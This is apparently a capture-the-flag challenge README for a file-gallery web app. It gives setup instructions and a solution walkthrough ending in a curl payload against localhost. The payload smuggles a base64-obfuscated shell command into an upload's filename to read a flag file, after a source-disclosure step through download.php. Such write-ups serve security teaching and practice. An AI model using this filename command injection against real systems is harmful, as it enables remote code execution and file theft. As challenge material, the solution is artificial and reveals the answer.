# Gridious Gallery

Creator: Heikki Miinalainen

To run fix permissions on the staging folder `sudo chown -R 33:33 staging`

## Solution

1. Notice how you can download files with download.php
1. Download upload.php to read source code
1. Notice RCE in the file type check
1. Send a payload in file name

Example payload
```
echo | curl -X POST http://127.0.0.1:3013/upload.php -F "file=@-;filename=\"testfile; echo $(echo cat ../flag.txt | base64) | base64 -d | bash \""
```
